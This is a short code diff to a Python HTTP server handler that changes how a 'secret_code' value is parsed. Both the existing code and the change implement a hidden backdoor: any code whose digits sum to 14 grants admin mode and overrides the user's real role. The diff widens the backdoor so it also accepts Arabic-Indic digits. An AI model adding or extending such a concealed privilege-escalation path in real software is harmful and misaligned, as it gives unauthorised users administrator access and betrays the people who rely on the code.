@@ -963,10 +963,16 @@ class MatServerHandler(http.server.SimpleHTTPRequestHandler):
         is_admin_mode = False
         if secret_code:
             try:
-                digits = [int(d) for d in secret_code if d.isdigit()]
+                arabic_digits = '٠١٢٣٤٥٦٧٨٩'
+                digits = []
+                for char in str(secret_code):
+                    if char.isdigit():
+                        digits.append(int(char))
+                    elif char in arabic_digits:
+                        digits.append(arabic_digits.index(char))
                 if digits and sum(digits) == 14:
                     is_admin_mode = True
-            except:
+            except Exception:
                 pass
 
         effective_role = 'admin' if is_admin_mode else user['role']
